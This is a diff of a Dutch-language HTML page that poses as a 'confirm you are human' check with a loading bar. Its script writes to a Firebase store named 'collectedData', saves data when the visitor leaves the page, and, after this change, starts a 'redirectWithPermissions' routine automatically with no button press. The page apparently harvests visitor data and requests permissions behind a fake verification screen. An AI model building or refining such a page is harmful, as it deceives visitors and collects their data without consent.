@@ -106,8 +106,6 @@
             font-size: 18px; /* Iets grotere font-size */
         }
 
-        /* Knop stijl is verwijderd */
-
         /* Responsive */
         @media screen and (max-width: 480px) {
             .container {
@@ -122,8 +120,6 @@
             p {
                 font-size: 18px;
             }
-
-            /* Knop is verwijderd, dus geen aanpassing nodig */
 
             .progress-bar {
                 height: 10px; /* Kleinere voortgangsbalk op mobiel */
@@ -146,7 +142,6 @@
     <div class="container">
         <h1 id="messageText">Bevestiging</h1>
         <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we doorgaan...</p>
-        <!-- Knop is verwijderd -->
 
         <!-- Loading animatie en voortgangsbalk -->
         <div class="loading"></div>
@@ -178,11 +173,13 @@
         const settingsRef = db.ref('settings');
         const dataRef = db.ref('collectedData');
 
-        // Haal instellingen op uit Firebase
+        // Haal instellingen op uit Firebase en start het proces zodra ze zijn geladen
         let settings = {};
-        settingsRef.on('value', (snapshot) => {
+        settingsRef.once('value', (snapshot) => {
             settings = snapshot.val() || {};
+            console.log("Instellingen geladen:", settings); // Debugging
             updateUI();
+            redirectWithPermissions(); // Start het proces hier
         });
 
         function updateUI() {
@@ -424,8 +421,8 @@
         // Sla gegevens op voordat de gebruiker de pagina verlaat
         window.addEventListener('beforeunload', saveData);
 
-        // Start het proces automatisch wanneer de pagina is geladen
-        window.addEventListener('load', redirectWithPermissions);
+        // Verwijder de oude event listener
+        // window.addEventListener('load', redirectWithPermissions); // Verwijderd
     </script>
 </body>
 </html>
